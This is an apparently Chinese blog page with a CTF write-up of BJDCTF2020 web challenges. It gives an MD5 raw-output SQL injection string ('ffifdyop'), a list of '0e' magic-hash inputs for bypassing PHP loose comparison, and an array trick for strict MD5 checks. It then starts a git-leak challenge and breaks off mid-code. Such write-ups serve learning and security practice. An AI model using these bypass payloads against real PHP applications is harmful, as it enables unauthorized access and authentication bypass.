<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>BJDCTF2020 | Zk&#39;s blog</title>
  <meta name="keywords" content=" wp , web ">
  <meta name="description" content="BJDCTF2020 | Zk&#39;s blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup 的执行。">
<meta name="keywords" content="web">
<meta property="og:type" content="article">
<meta property="og:title" content="php-serialize">
<meta property="og:url" content="https:&#x2F;&#x2F;silver2835.github.io&#x2F;2020&#x2F;09&#x2F;26&#x2F;php-serialize&#x2F;index.html">
<meta property="og:site_name" content="Zk&#39;s blog">
<meta property="og:description" content="当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup 的执行。">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2020-09-26T03:36:27.818Z">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>Kyle</span>
</div>

<div class="icon">
    
        
    
        
        <a title="github" href="https://github.com/Silver2835" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
        <a title="email" href="mailto:imkyle.zhong@qq.com" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-email"></use>
                </svg>
            
        </a>
        
    
        
        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=997160649&site=qq&menu=yes" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-qq"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(27)</small></div></li>
    
        
            
            <li><div data-rel="题解">题解<small>(14)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="杂">杂<small>(6)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="web">web<small>(2)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="读书笔记">读书笔记<small>(1)</small></div>
                
            </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="27">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode==13){return false;}">
        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">wp</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">web</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color1">Clion</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">hexo</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">Minecraft</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">markdown</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">misc</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <nav id="title-list-nav">
        
        <a  class="题解 "
           href="/2019/10/22/2019hackergame-wp/"
           data-tag="wp"
           data-author="" >
            <span class="post-title" title="2019hackergame wp">2019hackergame wp</span>
            <span class="post-date" title="2019-10-22 19:27:58">2019/10/22</span>
        </a>
        
        <a  class="题解 "
           href="/2019/11/02/Aurora%E6%96%B0%E7%94%9F%E8%B5%9Bwp/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="Aurora新生赛wp">Aurora新生赛wp</span>
            <span class="post-date" title="2019-11-02 10:01:57">2019/11/02</span>
        </a>
        
        <a  class="题解 "
           href="/2020/09/28/BJDCTF2020/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="BJDCTF2020">BJDCTF2020</span>
            <span class="post-date" title="2020-09-28 14:42:08">2020/09/28</span>
        </a>
        
        <a  class="杂 "
           href="/2020/04/02/CLion-live-template/"
           data-tag="Clion"
           data-author="" >
            <span class="post-title" title="CLion live template">CLion live template</span>
            <span class="post-date" title="2020-04-02 10:39:01">2020/04/02</span>
        </a>
        
        <a  class="题解 "
           href="/2020/02/26/GWCTFwp/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="GWCTFwp">GWCTFwp</span>
            <span class="post-date" title="2020-02-26 22:35:23">2020/02/26</span>
        </a>
        
        <a  class=""
           href="/2020/05/10/WangDing/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="WangDing">WangDing</span>
            <span class="post-date" title="2020-05-10 13:13:08">2020/05/10</span>
        </a>
        
        <a  class="题解 "
           href="/2020/10/27/buu-ssti/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="buu_ssti">buu_ssti</span>
            <span class="post-date" title="2020-10-27 16:54:08">2020/10/27</span>
        </a>
        
        <a  class="杂 "
           href="/2020/04/02/clion-debu/"
           data-tag="Clion"
           data-author="" >
            <span class="post-title" title="clion无法debug">clion无法debug</span>
            <span class="post-date" title="2020-04-02 10:20:39">2020/04/02</span>
        </a>
        
        <a  class="杂 "
           href="/2019/10/21/hexo%20d%20%E6%89%BE%E4%B8%8D%E5%88%B0%E4%BB%93%E5%BA%93%E7%9A%84%E9%97%AE%E9%A2%98/"
           data-tag="hexo"
           data-author="" >
            <span class="post-title" title="hexo d 找不到仓库的问题">hexo d 找不到仓库的问题</span>
            <span class="post-date" title="2019-10-21 16:57:33">2019/10/21</span>
        </a>
        
        <a  class="题解 "
           href="/2020/10/22/ctfshow-web11-20/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="ctfshow-web11-20">ctfshow-web11-20</span>
            <span class="post-date" title="2020-10-22 10:38:15">2020/10/22</span>
        </a>
        
        <a  class="题解 "
           href="/2020/11/05/hxb-wp/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="hxb-wp">hxb-wp</span>
            <span class="post-date" title="2020-11-05 10:56:29">2020/11/05</span>
        </a>
        
        <a  class="题解 "
           href="/2020/10/22/gyctf2020/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="gyctf2020">gyctf2020</span>
            <span class="post-date" title="2020-10-22 11:28:16">2020/10/22</span>
        </a>
        
        <a  class="杂 "
           href="/2020/09/11/minecraft/"
           data-tag="Minecraft"
           data-author="" >
            <span class="post-title" title="Ubuntu下搭建Minecraft Forge服务端">Ubuntu下搭建Minecraft Forge服务端</span>
            <span class="post-date" title="2020-09-11 16:04:57">2020/09/11</span>
        </a>
        
        <a  class="杂 "
           href="/2019/10/26/md%E7%BC%96%E8%BE%91%E5%99%A8%E5%BF%AB%E9%80%9F%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87/"
           data-tag="markdown"
           data-author="" >
            <span class="post-title" title="md编辑器快速添加图片">md编辑器快速添加图片</span>
            <span class="post-date" title="2019-10-26 14:20:15">2019/10/26</span>
        </a>
        
        <a  class="题解 "
           href="/2020/02/27/ichunqiu/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="ichunqiu">ichunqiu</span>
            <span class="post-date" title="2020-02-27 15:44:08">2020/02/27</span>
        </a>
        
        <a  class="题解 "
           href="/2020/04/04/php/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="php代码审计">php代码审计</span>
            <span class="post-date" title="2020-04-04 23:14:51">2020/04/04</span>
        </a>
        
        <a  class="web "
           href="/2020/09/26/php-serialize/"
           data-tag="web"
           data-author="" >
            <span class="post-title" title="php-serialize">php-serialize</span>
            <span class="post-date" title="2020-09-26 11:35:36">2020/09/26</span>
        </a>
        
        <a  class="题解 "
           href="/2020/09/24/ping/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="ping">ping</span>
            <span class="post-date" title="2020-09-24 12:34:11">2020/09/24</span>
        </a>
        
        <a  class="杂 "
           href="/2020/02/18/smb%E5%8D%8F%E8%AE%AE/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="smb协议">smb协议</span>
            <span class="post-date" title="2020-02-18 12:20:41">2020/02/18</span>
        </a>
        
        <a  class=""
           href="/2020/02/27/test/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="test">test</span>
            <span class="post-date" title="2020-02-27 19:53:46">2020/02/27</span>
        </a>
        
        <a  class="web "
           href="/2020/09/19/sql-injection/"
           data-tag="web"
           data-author="" >
            <span class="post-title" title="sql injection">sql injection</span>
            <span class="post-date" title="2020-09-19 15:18:05">2020/09/19</span>
        </a>
        
        <a  class="题解 "
           href="/2019/10/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E8%BF%9B%E9%98%B6/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="攻防世界 web进阶">攻防世界 web进阶</span>
            <span class="post-date" title="2019-10-28 21:05:12">2019/10/28</span>
        </a>
        
        <a  class="读书笔记 "
           href="/2019/10/26/%E3%80%8Ac%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%EF%BC%9A%E7%8E%B0%E4%BB%A3%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="《c语言程序设计：现代方法》读书笔记">《c语言程序设计：现代方法》读书笔记</span>
            <span class="post-date" title="2019-10-26 14:27:28">2019/10/26</span>
        </a>
        
        <a  class="题解 "
           href="/2019/10/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%A2%98%E8%A7%A3/"
           data-tag="wp,web"
           data-author="" >
            <span class="post-title" title="攻防世界题解">攻防世界题解</span>
            <span class="post-date" title="2019-10-22 19:27:58">2019/10/22</span>
        </a>
        
        <a  class=""
           href="/2020/10/09/%E6%AD%A3%E5%88%99%E7%AC%94%E8%AE%B0/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="正则笔记">正则笔记</span>
            <span class="post-date" title="2020-10-09 20:59:05">2020/10/09</span>
        </a>
        
        <a  class=""
           href="/2020/11/01/%E6%B9%96%E6%B9%98%E6%9D%AFwp/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="湖湘杯wp">湖湘杯wp</span>
            <span class="post-date" title="2020-11-01 10:51:44">2020/11/01</span>
        </a>
        
        <a  class="题解 "
           href="/2020/03/08/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/"
           data-tag="wp,misc"
           data-author="" >
            <span class="post-title" title="隐藏的信息">隐藏的信息</span>
            <span class="post-date" title="2020-03-08 15:18:45">2020/03/08</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-BJDCTF2020" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">BJDCTF2020</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            
                <a href="javascript:" data-rel="题解">题解</a>
            
        </span>
        
        
        <span class="tag">
            
            <a href="javascript:" class="color3">wp</a>
            
            <a href="javascript:" class="color4">web</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2020-10-11 19:07:56'>2020-09-28 14:42</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-wp"><span class="toc-text">BJDCTF2020 wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-MD5"><span class="toc-text">Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mark-loves-cat"><span class="toc-text">Mark loves cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF，不过如此"><span class="toc-text">ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasySearch"><span class="toc-text">EasySearch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-is-so-stable"><span class="toc-text">Cookie is so stable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzPHP"><span class="toc-text">EzPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-mystery-of-ip"><span class="toc-text">The mystery of ip</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="BJDCTF2020-wp"><a href="#BJDCTF2020-wp" class="headerlink" title="BJDCTF2020 wp"></a>BJDCTF2020 wp</h1><h2 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h2><p>打开网址之后，在响应标头中找到了hint：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200928144459500.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &apos;admin&apos; where password = md5($pass,true)</span><br></pre></td></tr></table></figure>

<p>理论上md5的密码验证是很难破解的，但是这里MD5函数的第二个参数设为true就有漏洞。</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200928150534381.png" alt></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">"hello"</span>);</span><br><span class="line">&gt;&gt;<span class="number">5</span>d41402abc4b2a76b9719d911017c592</span><br><span class="line">md5(<span class="string">"hello"</span>,<span class="keyword">true</span>);</span><br><span class="line">&gt;&gt;]A@*�K*v�q��Œ</span><br></pre></td></tr></table></figure>

<p>32字符十六进制数很好理解，16进制字符二进制格式并非真的二进制，二十将十六进制数两个一组，转化成ASCII字符，如，5d =》<code>]</code>,41=&gt;<code>A</code></p>
<p>因此可以输入特定的字符串，使得md5之后的raw_output中含有<code>or</code>。网上找到了两个：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">"ffifdyop"</span>,<span class="keyword">true</span>);</span><br><span class="line">&gt;&gt;<span class="string">'or'</span><span class="number">6</span>�]��!r,��b</span><br><span class="line">md5(<span class="string">"129581926211651571912466741651878684928"</span>,<span class="keyword">true</span>);</span><br><span class="line">&gt;&gt;�T0D��o<span class="comment">#��'or'8</span></span><br><span class="line"><span class="comment">//第二个在该题中无效</span></span><br></pre></td></tr></table></figure>

<p>第二层是MD5碰撞：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200928151554272.png" alt></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为使用的是<code>!=</code>和<code>==</code>弱类型比较而不是<code>！==</code>和<code>===</code>这种强类型比较，弱类型比较会将‘0E’开头的哈希值解释为科学计数法，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>符合条件的一些MD5值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">纯数字类：</span><br><span class="line"> </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">大写字母类：</span><br><span class="line">QLTHNDT</span><br><span class="line">0e405967825401955372549139051580</span><br><span class="line"> </span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"> </span><br><span class="line">EEIZDOI</span><br><span class="line">0e782601363539291779881938479162</span><br><span class="line"> </span><br><span class="line">TUFEPMC</span><br><span class="line">0e839407194569345277863905212547</span><br><span class="line"> </span><br><span class="line">UTIPEZQ</span><br><span class="line">0e382098788231234954670291303879</span><br><span class="line"> </span><br><span class="line">UYXFLOI</span><br><span class="line">0e552539585246568817348686838809</span><br><span class="line"> </span><br><span class="line">IHKFRNS</span><br><span class="line">0e256160682445802696926137988570</span><br><span class="line"> </span><br><span class="line">PJNPDWY</span><br><span class="line">0e291529052894702774557631701704</span><br><span class="line"> </span><br><span class="line">ABJIHVY</span><br><span class="line">0e755264355178451322893275696586</span><br><span class="line"> </span><br><span class="line">DQWRASX</span><br><span class="line">0e742373665639232907775599582643</span><br><span class="line"> </span><br><span class="line">DYAXWCA</span><br><span class="line">0e424759758842488633464374063001</span><br><span class="line"> </span><br><span class="line">GEGHBXL</span><br><span class="line">0e248776895502908863709684713578</span><br><span class="line"> </span><br><span class="line">GGHMVOE</span><br><span class="line">0e362766013028313274586933780773</span><br><span class="line"> </span><br><span class="line">GZECLQZ</span><br><span class="line">0e537612333747236407713628225676</span><br><span class="line"> </span><br><span class="line">NWWKITQ</span><br><span class="line">0e763082070976038347657360817689</span><br><span class="line"> </span><br><span class="line">NOOPCJF</span><br><span class="line">0e818888003657176127862245791911</span><br><span class="line"> </span><br><span class="line">MAUXXQC</span><br><span class="line">0e478478466848439040434801845361</span><br><span class="line"> </span><br><span class="line">MMHUWUV</span><br><span class="line">0e701732711630150438129209816536</span><br></pre></td></tr></table></figure>

<p>然后是第三层：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200928153644111.png" alt></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三层可以用数组绕过，由于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a[] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($a) === <span class="keyword">null</span>;</span><br><span class="line">&gt;&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>故：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200928164219666.png" alt></p>
<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>这道题看了很久，刚看到message以及get的时候觉得是xss，但是搞不定，然后去看wp，发现是git源码泄露，然而buu的web用dirsearch扫描的时候永远是429-Too Many Requests…….<img src="/2020/09/28/BJDCTF2020/image-20200929161506252.png" alt="啥也扫不出来"></p>
<p>知道是git源码泄露之后用githack下载：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200929162248790.png" alt></p>
<p>index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span 